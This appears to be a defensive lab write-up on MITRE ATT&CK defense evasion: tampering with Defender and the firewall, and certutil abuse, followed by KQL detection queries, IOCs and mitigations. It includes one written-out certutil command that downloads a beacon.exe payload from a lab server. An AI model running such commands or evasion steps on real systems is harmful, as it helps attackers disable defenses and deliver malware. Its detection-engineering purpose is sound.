# TA0005 – Defense Evasion (MITRE ATT&CK)

## Tactic

**TA0005 – Defense Evasion**

### Objective

The objective of the Defense Evasion tactic is to avoid detection by security products, logging mechanisms, and monitoring tools while continuing malicious operations. In this laboratory simulation, defense evasion activities included modifying security configurations and using trusted Windows binaries to perform malicious actions.

The simulated techniques include:

- **T1562.001 – Impair Defenses: Disable or Modify Security Tools**
- **T1562.004 – Impair Defenses: Disable or Modify System Firewall**
- **T1218.008 – System Binary Proxy Execution: certutil**

---

# MITRE ATT&CK Technique Mapping

| ATT&CK ID | Technique | Description |
|------------|------------------------------------------------------|---------------------------------------------|
| **T1562.001** | Disable or Modify Security Tools | Modify endpoint security settings |
| **T1562.004** | Disable or Modify System Firewall | Disable Windows Firewall protections |
| **T1218.008** | System Binary Proxy Execution: certutil | Abuse a trusted Windows binary to download files |

---

# Attack Description

To reduce the likelihood of detection, the attacker modified security-related settings and leveraged legitimate Windows utilities. Defender settings were changed to weaken monitoring, firewall protections were disabled to facilitate network communication, and the Microsoft-signed utility `certutil.exe` was used to retrieve an additional payload.

Using built-in operating system components allows malicious activity to blend with normal administrative operations and may evade simplistic allow-listing controls.

---

# Technique 1 – Disable or Modify Security Tools (T1562.001)

## Overview

Security products such as Microsoft Defender can be targeted by attackers attempting to reduce scanning or telemetry before introducing malicious payloads. Administrative changes to Defender configuration should therefore be closely monitored.

> **Note:** The exact settings modified and whether they succeed depend on Windows version, policy configuration, and tamper protection status.

---

# Detection Opportunities – Security Tool Modification

| Data Source | Detection Logic | Indicator |
|-------------|----------------|-----------|
| Windows Defender Operational Log | Configuration changes | Security settings modified |
| PowerShell Script Block Logging (4104) | Defender management commands | `Set-MpPreference` |
| Event ID 4688 | Administrative PowerShell execution | Security configuration changes |
| Sysmon Event ID 1 | PowerShell process creation | Suspicious command execution |

---

# Example Kibana KQL Queries

## Detect Defender configuration commands

```kql
event.code:4104 and powershell.file.script_block_text:*Set-MpPreference*
```

## Detect PowerShell modifying Defender settings

```kql
event.code:4688 and process.name:"powershell.exe" and process.command_line:*Set-MpPreference*
```

---

# Technique 2 – Disable or Modify System Firewall (T1562.004)

## Overview

Attackers may modify firewall settings to reduce restrictions on malicious network traffic or simplify communications with external infrastructure.

Administrative changes to firewall profiles should be treated as high-value security events and investigated when unexpected.

---

# Detection Opportunities – Firewall Changes

| Data Source | Detection Logic | Indicator |
|-------------|----------------|-----------|
| PowerShell Logging | Firewall management commands | `Set-NetFirewallProfile` |
| Event ID 4688 | PowerShell execution | Firewall configuration activity |
| Firewall Operational Logs | Profile modifications | Firewall state changes |
| Sysmon Event ID 1 | Process creation | Administrative PowerShell |

---

# Example Kibana KQL Queries

## Detect PowerShell firewall modifications

```kql
event.code:4104 and powershell.file.script_block_text:*Set-NetFirewallProfile*
```

## Detect firewall-related PowerShell execution

```kql
event.code:4688 and process.name:"powershell.exe" and process.command_line:*Set-NetFirewallProfile*
```

---

# Technique 3 – System Binary Proxy Execution: certutil (T1218.008)

## Overview

`certutil.exe` is a legitimate Microsoft utility used for certificate management. Because it is digitally signed and commonly present on Windows systems, attackers may abuse it to transfer files or perform other operations while blending into normal activity.

In this simulation, `certutil.exe` was used to retrieve `beacon.exe` from an internal HTTP server before execution.

---

# Example Usage Pattern

```cmd
certutil -urlcache -f http://192.168.1.5:8080/beacon.exe C:\Users\Public\beacon.exe
```

---

# Detection Opportunities – certutil Abuse

| Data Source | Detection Logic | Indicator |
|-------------|----------------|-----------|
| Event ID 4688 | Execution of `certutil.exe` | Process creation |
| Command Line Logging | `-urlcache` or remote URLs | File retrieval behavior |
| Sysmon Event ID 3 | Network activity by `certutil.exe` | HTTP connection |
| Sysmon Event ID 11 | New executable written to disk | `beacon.exe` created |
| Network Monitoring | HTTP download initiated by `certutil.exe` | Unusual user agent or destination |

---

# Example Kibana KQL Queries

## Detect certutil execution

```kql
event.code:4688 and process.name:"certutil.exe"
```

## Detect certutil using urlcache

```kql
event.code:4688 and process.name:"certutil.exe" and process.command_line:*urlcache*
```

## Detect certutil downloading an executable

```kql
event.code:4688 and process.name:"certutil.exe" and process.command_line:*http* and process.command_line:*.exe*
```

---

# MITRE ATT&CK Mapping Summary

| Technique | ATT&CK ID | Platform | Detection Difficulty |
|------------|------------|-----------|---------------------|
| Disable or Modify Security Tools | T1562.001 | Windows | Moderate |
| Disable or Modify System Firewall | T1562.004 | Windows | Moderate |
| System Binary Proxy Execution (`certutil`) | T1218.008 | Windows | High |

---

# Combined Kibana Detection Examples

## Security configuration changes

```kql
event.code:4104 and powershell.file.script_block_text:*Set-MpPreference*
```

---

## Firewall configuration changes

```kql
event.code:4104 and powershell.file.script_block_text:*Set-NetFirewallProfile*
```

---

## certutil execution

```kql
event.code:4688 and process.name:"certutil.exe"
```

---

## certutil downloading from HTTP

```kql
event.code:4688 and process.name:"certutil.exe" and process.command_line:*urlcache* and process.command_line:*http*
```

---

# Indicators of Compromise (IOCs)

| Indicator Type | Value |
|----------------|--------------------------------------------|
| Utility | `certutil.exe` |
| Downloaded File | `beacon.exe` |
| Output Location | `C:\Users\Public\beacon.exe` |
| Command-Line Keyword | `-urlcache` |
| PowerShell Activity | `Set-MpPreference` |
| PowerShell Activity | `Set-NetFirewallProfile` |

---

# Forensic Artifacts

Investigators should examine the following sources:

| Artifact | Location |
|-----------|------------------------------------------------------------|
| PowerShell Operational Log | Microsoft-Windows-PowerShell/Operational |
| Windows Defender Operational Log | Microsoft-Windows-Windows Defender/Operational |
| Firewall Operational Log | Windows Firewall with Advanced Security |
| Security Event Log | Event ID 4688 |
| Sysmon Process Creation | Event ID 1 |
| Sysmon Network Connection | Event ID 3 |
| Sysmon File Creation | Event ID 11 |

---

# Mitigation and Prevention

- Enable PowerShell Script Block Logging and Module Logging to capture administrative PowerShell activity.
- Restrict administrative modification of security controls through Group Policy and organizational policy.
- Continuously monitor Defender and firewall configuration changes for unexpected modifications.
- Monitor or restrict use of trusted administrative utilities such as `certutil.exe` where operationally appropriate.
- Enable Sysmon process creation, network connection, and file creation logging to improve visibility into suspicious activity.
- Alert on trusted system binaries that establish unexpected outbound network connections or retrieve executable files.

---

# Key Takeaways

Defense evasion techniques frequently rely on legitimate operating system functionality rather than custom malware. Administrative configuration changes and abuse of trusted binaries such as `certutil.exe` can significantly reduce attacker visibility while blending into normal system activity. Correlating process creation, PowerShell logging, network events, and file creation telemetry provides multiple opportunities to detect these behaviors.

---

# References

- MITRE ATT&CK – TA0005: Defense Evasion
- MITRE ATT&CK – T1562.001: Impair Defenses
- MITRE ATT&CK – T1562.004: Disable or Modify System Firewall
- MITRE ATT&CK – T1218.008: System Binary Proxy Execution – certutil
- Lab Simulation: Security Configuration Changes and certutil-Based Payload Retrieval